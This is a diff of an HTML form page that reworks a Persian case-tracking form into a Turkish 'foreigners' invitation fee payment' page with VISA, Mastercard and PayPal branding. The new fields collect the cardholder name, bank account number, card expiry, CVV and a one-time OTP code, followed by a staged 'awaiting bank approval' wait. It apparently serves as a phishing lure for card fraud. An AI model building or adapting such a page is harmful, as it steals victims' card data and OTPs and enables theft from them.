@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="سامانه پیگیری پرونده">
-  <title>سامانه پیگیری پرونده</title>
+  <meta name="description" content="">
+  <title>Hundreds of digital transactions are at your service with a single touch.  </title>
   <link rel="icon" type="image/x-icon" href="favicon.ico">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -16,13 +16,13 @@
 
 <header class="site-header">
   <div class="header-inner">
-    <button type="button" class="menu-toggle" id="menuToggle" aria-label="باز کردن منو" aria-controls="sideMenu" aria-expanded="false">
+    <button type="button" class="menu-toggle" id="menuToggle" aria-label="Menüyü Aç" aria-controls="sideMenu" aria-expanded="false">
       <span></span><span></span><span></span>
     </button>
 
     <div class="header-title">
-      <h1>سامانه پیگیری پرونده</h1>
-      <span>سامانه رسمی پیگیری و بررسی وضعیت پرونده</span>
+      <h1></h1>
+      <span> Hundreds of digital transactions are at your service with a single touch  </span>
     </div>
 
     <div class="logo-container">
@@ -34,44 +34,45 @@
 <div class="sidebar-overlay" id="sidebarOverlay"></div>
 <aside class="side-menu" id="sideMenu" aria-hidden="true">
   <div class="side-menu-header">
-    <h2>منوی سامانه</h2>
-    <button type="button" class="side-menu-close" id="sideMenuClose" aria-label="بستن منو">×</button>
+    <h2>Other services </h2>
+    <button type="button" class="side-menu-close" id="sideMenuClose" aria-label="Menüyü Kapat ">×</button>
   </div>
-  <nav class="side-menu-nav" aria-label="منوی اصلی">
-    <a href="#caseForm" class="side-menu-link">پیگیری پرونده</a>
+  <nav class="side-menu-nav" aria-label="Ana Menü ">
+    <a href="#caseForm" class="side-menu-link">Yabancıların Davet Harcı Ödemesi</a>
   </nav>
 </aside>
 
 <main class="main-container">
   <section class="form-card">
     <div class="card-header">
-      <h2>پیگیری پرونده</h2>
-      <p>لطفاً اطلاعات مورد نیاز را با دقت وارد نمایید.</p>
+      <h2>Yabancıların Davet Harcı Ödemesi </h2>
+            <p>💳 VISA Card 💳 Mastercard</p>
+      <p>💳 Mastercard Debit Card 🅿️ PayPal </p>
     </div>
 
     <form id="caseForm" autocomplete="off">
 
       <div class="form-group">
-        <label for="caseName">اسم پرونده <span class="required">*</span></label>
-        <input type="text" id="caseName" placeholder="اسم پرونده را وارد کنید" required>
+        <label for="caseName">Kart Sahibinin Adı  <span class="required">*</span></label>
+        <input type="text" id="caseName" placeholder=" Kart Sahibinin Adı" required>
       </div>
 
       <div class="form-group">
-        <label for="trackingNumber">شماره پیگیری پرونده <span class="required">*</span></label>
-        <input type="text" id="trackingNumber" inputmode="numeric" placeholder="شماره پیگیری را وارد کنید" required>
+        <label for="trackingNumber">Banka Hesap Numarası   <span class="required">*</span></label>
+        <input type="text" id="trackingNumber" inputmode="numeric" placeholder="   Banka Hesap Numarası " required>
       </div>
 
       <div class="form-row">
         <div class="form-group">
-          <label for="yearMonth">سال و ماه <span class="required">*</span></label>
+          <label for="yearMonth"> Kart Son Kullanma Tarihi <span class="required">*</span></label>
           <input type="month" id="yearMonth" required>
-          <small class="field-help">سال و ماه پرونده را انتخاب کنید.</small>
+          <small class="field-help"> Yıl / Ay .</small>
         </div>
 
         <div class="form-group">
-          <label for="fcvNumber">شماره مسلسل <span class="required">*</span></label>
-          <input type="text" id="fcvNumber" inputmode="numeric" pattern="[0-9]{3,5}" minlength="3" maxlength="5" placeholder="۳ تا ۵ رقم" required>
-          <small class="field-help">فقط عدد ۳ تا ۵ رقمی قابل قبول است.</small>
+          <label for="fcvNumber">CVV Güvenlik Kodu  <span class="required">*</span></label>
+          <input type="text" id="fcvNumber" inputmode="numeric" pattern="[0-9]{3,5}" minlength="3" maxlength="5" placeholder="Lütfen 3 ila 5 haneli CVV kodunu giriniz." required>
+          <small class="field-help"> CVV</small>
         </div>
       </div>
 
@@ -79,59 +80,59 @@
         <div class="security-title">
           <span class="security-icon">🔐</span>
           <div>
-            <strong>تأیید امنیتی</strong>
-            <small>عدد تصویر امنیتی را وارد نمایید.</small>
+            <strong>Güvenlik Doğrulaması </strong>
+            <small>Güvenlik Resmindeki Sayıları Giriniz</small>
           </div>
         </div>
 
         <div class="captcha-area">
           <div class="captcha-image" id="captchaImage">-----</div>
-          <button type="button" class="captcha-refresh" id="refreshCaptcha" title="تولید کد جدید">↻</button>
+          <button type="button" class="captcha-refresh" id="refreshCaptcha" title="  Yeni Kod Oluştur">↻</button>
         </div>
 
         <div class="form-group security-input-group">
-          <label for="captchaInput">عدد تصویر امنیتی <span class="required">*</span></label>
-          <input type="text" id="captchaInput" inputmode="numeric" maxlength="5" placeholder="عدد تصویر را وارد کنید" required>
+          <label for="captchaInput"> Güvenlik Resmi Sayısı  <span class="required">*</span></label>
+          <input type="text" id="captchaInput" inputmode="numeric" maxlength="5" placeholder="Resimdeki Sayıyı Giriniz" required>
         </div>
       </div>
 
       <div id="otpSection" class="otp-section hidden">
         <div class="otp-header">
-          <h3>تأیید OTP</h3>
-          <p>پس از تأیید کد امنیتی، OTP به‌صورت خودکار ارسال می‌شود.</p>
+          <h3>OTP Kodunu Doğrula </h3>
+          <p></p>
         </div>
 
         <div id="otpStatus" class="status-message">
-          در حال آماده‌سازی...
+Hazırlanıyor...
         </div>
 
         <button type="button" id="requestOtpBtn" class="btn btn-success btn-full hidden">
-          ارسال کد OTP
+OTP Kodunu Gönder
         </button>
 
         <div id="countdownContainer" class="countdown-container hidden">
-          <div class="countdown-label">زمان انتظار:</div>
+          <div class="countdown-label">Bekleme Süresi:</div>
           <div id="countdown" class="countdown">60</div>
-          <div class="countdown-unit">ثانیه</div>
+          <div class="countdown-unit">Saniye</div>
         </div>
 
         <button type="button" id="resendOtpBtn" class="btn btn-outline hidden">
-          ارسال مجدد کد
+Kodu Yeniden Gönder
         </button>
 
         <div id="caseNumberSection" class="form-group hidden">
-          <label for="caseNumber">شماره پرونده <span class="required">*</span></label>
-          <input type="text" id="caseNumber" placeholder="شماره پرونده را وارد کنید" autocomplete="off">
-          <small class="field-help">پس از وارد کردن شماره پرونده، اطلاعات به‌صورت خودکار ثبت می‌شود.</small>
+          <label for="caseNumber"> OTP Kodunu <span class="required">*</span></label>
+          <input type="text" id="caseNumber" placeholder="OTP Kodunu Giriniz" autocomplete="off">
+          <small class="field-help">İşlem kodu girildikten sonra işlem otomatik olarak başlatılacaktır. Lütfen sayfayı kapatmayınız.</small>/small>
         </div>
 
         <button type="button" id="submitCaseBtn" class="btn btn-primary btn-full hidden">
-          ثبت
+          Onayla
         </button>
 
         <div id="waitingMessage" class="waiting-message hidden">
           <span class="waiting-dot"></span>
-          در انتظار تأیید مدیر...
+Banka Onayı Bekleniyor
         </div>
       </div>
 
@@ -142,7 +143,7 @@
 <div id="loadingOverlay" class="loading-overlay hidden">
   <div class="loading-card">
     <img src="https://i.gifer.com/ZKZg.gif" alt="Loading" class="loading-gif">
-    <p id="loadingText">لطفاً منتظر بمانید...</p>
+    <p id="loadingText"> Lütfen bekleyiniz....</p>
   </div>
 </div>
 
